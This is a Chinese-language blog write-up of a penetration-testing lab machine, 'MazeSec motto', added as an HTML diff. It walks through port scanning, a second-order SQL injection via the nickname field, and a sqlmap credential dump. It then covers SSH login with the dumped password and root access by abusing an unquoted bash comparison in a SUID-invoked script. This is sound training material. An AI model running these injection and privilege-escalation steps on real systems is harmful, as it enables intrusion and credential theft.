@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec motto</title>
+        <meta name="description" content="靶机说明 关键词：二阶 SQL 注入、sqlmap 自动化利用、密码复用、bash 比较注入、SUID bash 提权 摘要：本文记录了 MazeSec motto 靶机的渗透过程。选手通过端口扫描发现 9090 端口运行着定制 Web 服务，在修改用户昵称处插入恶意载荷后发现座右铭展示页面出现了数据泄露，确认为二阶 …">
+    <link rel="canonical" href="https://the0n3.top/pages/maze-motto/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec motto">
+    <meta property="og:description" content="靶机说明 关键词：二阶 SQL 注入、sqlmap 自动化利用、密码复用、bash 比较注入、SUID bash 提权 摘要：本文记录了 MazeSec motto 靶机的渗透过程。选手通过端口扫描发现 9090 端口运行着定制 Web 服务，在修改用户昵称处插入恶意载荷后发现座右铭展示页面出现了数据泄露，确认为二阶 …">
+    <meta property="og:url" content="https://the0n3.top/pages/maze-motto/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-motto/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec motto">
+    <meta name="twitter:description" content="靶机说明 关键词：二阶 SQL 注入、sqlmap 自动化利用、密码复用、bash 比较注入、SUID bash 提权 摘要：本文记录了 MazeSec motto 靶机的渗透过程。选手通过端口扫描发现 9090 端口运行着定制 Web 服务，在修改用户昵称处插入恶意载荷后发现座右铭展示页面出现了数据泄露，确认为二阶 …">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-motto/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec motto</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-12 16:35</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机说明</h2>
+<p><strong>关键词</strong>：二阶 SQL 注入、sqlmap 自动化利用、密码复用、bash 比较注入、SUID bash 提权</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec motto 靶机的渗透过程。选手通过端口扫描发现 9090 端口运行着定制 Web 服务，在修改用户昵称处插入恶意载荷后发现座右铭展示页面出现了数据泄露，确认为二阶 SQL 注入漏洞；利用 sqlmap 的 --second-url 参数自动化攻击，从数据库中导出用户凭证，使用 RedBean/cannotforgetyou 成功登录 SSH；在 redbean 用户目录下发现 .backup 备份文件夹，审计其中的 C 源码与 Shell 脚本发现 run_newsh 设置了 SUID 位且内部调用了存在缺陷的 new.sh；利用 bash 脚本中未加引号的变量比较漏洞（$1 = "flag" 与 [ $1 = "flag" ] 的解析差异），传入含空格的参数绕过安全限制，触发 chmod +s /bin/bash 逻辑；最终执行带权限的 bash -p 获取 root 权限。该靶机重点考察了二阶注入的联动利用、源码审计以及 Shell 脚本因引号缺失导致的权限提升风险。</p>
+<h2>1. 信息收集与资产发现</h2>
+<p>ARP 扫描定位目标：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/motto]
+└─$ sudo arp-scan -I eth1 192.168.56.0/24
+
+192.168.56.151  08:00:27:85:f7:72       PCS Systemtechnik GmbH</code></pre>
+<p>端口与服务探测：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/motto]
+└─$ nmap -p- -sT 192.168.56.151
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9090/tcp open  zeus-admin</code></pre>
+<h2>2. 功能测试与初步验证</h2>
+<ul>
+<li>注册任意用户，尝试模板注入、XSS 注入，未见有效触发。</li>
+<li>在「个人信息」与「我的座右铭」模块间切换观察联动。</li>
+</ul>
+<p><img src="/images/maze-motto/1.png" alt="" decoding="async" width="525" height="270"></p>
+<h2>3. 二阶 SQL 注入发现</h2>
+<p>在 <code>/myinfo</code> 修改昵称为 <code>'or 1='1</code> 后，到 <code>/mymottos</code> 页面发现出现所有用户的 motto，推测存在二阶 SQL 注入（源头在个人信息保存，生效点在座右铭查询）。</p>
+<p><img src="/images/maze-motto/2.png" alt="" decoding="async" loading="lazy" width="704" height="390">
+<img src="/images/maze-motto/3.png" alt="" decoding="async" loading="lazy" width="491" height="272">
+<img src="/images/maze-motto/4.png" alt="" decoding="async" loading="lazy" width="1257" height="620"></p>
+<p>抓包样例（修改昵称）：</p>
+<pre><code class="language-bash">POST /changeNickName HTTP/1.1
+Host: 192.168.56.151:9090
+Content-Length: 10
+Cache-Control: max-age=0
+Origin: http://192.168.56.151:9090
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.56.151:9090/myinfo
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: yliken_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjI5NTY3ODYsImlhdCI6IjIwMjUtMTEtMTJUMDg6NDM6MDYuNTkwNzUyMjQ3LTA1OjAwIiwibmlja25hbWUiOiInb3IgMT0nMSIsInVzZXJuYW1lIjoiMTExIn0.-vNEQ2LJgN7h9b58eq0LtyLOq8yZ7PxcXsnOU5ID4j4
+Connection: keep-alive
+
+nickname=1</code></pre>
+<h2>4. 自动化验证与数据证明</h2>
+<p>使用二阶注入参数与二次访问入口（--second-url）：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/motto]
+└─$ sqlmap -r sql.txt --second-url "http://192.168.56.151:9090/mymottos" --dbs --batch --dump </code></pre>
+<p>部分数据（证明）：</p>
+<pre><code>Database: sql
+Table: register_infos
+[3 entries]
++---------+----------+-----------------+-----------------+
+| user_id | nickname | password        | username        |
++---------+----------+-----------------+-----------------+
+| 1       | admin    | admin is no use | admin is no use |
+| 2       | RedBean  | cannotforgetyou | RedBean         |
+| 4       | 111      | 111111          | 111             |
++---------+----------+-----------------+-----------------+
+
+Database: sql
+Table: motto_infos
+[13 entries]
++----------+----------------------------------------------------------------------------------+-----------+
+| motto_id | motto                                                                            | nick_name |
++----------+----------------------------------------------------------------------------------+-----------+
+| 1        | 认识的人越多 我就越喜欢狗.                                                       | ll104567  |
+| 3        | 他说你任何为人称道的美丽 不及他第一次遇到你                                      | Yliken    |
+| 6        | 你是我患得患失的梦，我是你可有可无的人。毕竟这穿越山河的箭，刺的都是用情致疾的人 | Yliken    |
+| 7        | 真正的大师永远都怀一颗学徒的心                                                   | ta0       |
+| 8        | The best way to learn is to teach. Keep writing, keep sharing!                   | LingMj    |
+| 9        | the quieter you become, the more you can hear                                    | c1trus    |
+| 10       | Records of life and study at sunset.                                             | sunset    |
+| 11       | 红豆生南国 春来发几枝 愿君多采撷 此物最相思                                      | RedBean   |
+| 12       | 想念的终究会相遇吧                                                               | HYH       |
+| 13       | where is my shell?                                                               | DingTom   |
+| 14       | {{''.__class__}}                                                                 | 111       |
+| 15       | phpinfo();                                                                       | 111       |
+| 16       | &lt;img src='127.0.0.1'&gt;111&lt;/img&gt;                                                   | 111       |
++----------+----------------------------------------------------------------------------------+-----------+</code></pre>
+<p><img src="/images/maze-motto/5.png" alt="" decoding="async" loading="lazy" width="1080" height="782"></p>
+<h2>5. 横向进入（SSH）</h2>
+<p>根据 register_infos 表信息尝试登录，<code>redbean/cannotforgetyou</code> 成功：
+<img src="/images/maze-motto/6.png" alt="" decoding="async" loading="lazy" width="757" height="401"></p>
+<h2>6. bash 比较注入</h2>
+<p>家目录存在备份目录 <code>.backup</code>，内含 <code>new.sh</code> 与 <code>run_newsh.c</code>：</p>
+<pre><code class="language-bash">bash-5.0$ ls -lah
+total 16K
+drwxr-xr-x 2 root    root    4.0K Jul 31 08:27 .
+drwxr-xr-x 3 redbean redbean 4.0K Nov 12 05:59 ..
+-r--r--r-- 1 root    root    1.7K Jul 31 02:46 new.sh     
+-rw-r--r-- 1 root    root     509 Jul 31 08:27 run_newsh.c</code></pre>
+<p><code>run_newsh.c</code> 核心逻辑（以 root 权限调用 <code>/opt/new.sh</code> 并传参）：</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s &lt;arg&gt;\n", argv[0]);
+        return 1;
+    }
+    setuid(0);
+    setgid(0);
+    char *script = "/opt/new.sh";
+    char *args[] = { script, argv[1], NULL };
+    execv(script, args);
+    perror("execv failed");
+    return 1;
+}</code></pre>
+<p><code>new.sh</code> 关键判断（节选）：</p>
+<pre><code class="language-bash">14  [ -n "$1" ] || exit 1
+15  [ "$1" = "flag" ] &amp;&amp; exit 2
+16  [ $1 = "flag" ] &amp;&amp; chmod +s /bin/bash</code></pre>
+<p>说明：</p>
+<ul>
+<li>15 行使用了被引号包裹的参数比较。</li>
+<li>16 行未加引号，存在单词分割/空白影响的风险。</li>
+</ul>
+<p>系统 SUID 文件检索：</p>
+<pre><code class="language-bash">redbean@motto:~$ find / -perm -4000 -type f 2&gt;/dev/null
+/opt/run_newsh</code></pre>
+<h2>7. 提权利用与验证</h2>
+<p>利用未加引号的比较差异，传入包含空格的参数，使 15 行判断不等而 16 行判断等，从而为 <code>/bin/bash</code> 赋予 SUID：</p>
+<p><img src="/images/maze-motto/7.png" alt="" decoding="async" loading="lazy" width="949" height="898"></p>
+<p>获取 euid=0：</p>
+<pre><code class="language-bash">redbean@motto:/opt$ /bin/bash -p
+redbean@motto:/opt# id
+uid=1000(redbean) gid=1000(redbean) euid=0(root) egid=0(root) groups=0(root),1000(redbean)
+redbean@motto:/opt#</code></pre>
+<p><img src="/images/maze-motto/8.png" alt="" decoding="async" loading="lazy" width="856" height="146"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#二阶注入</span>
+                                    <span>#bash比较注入</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
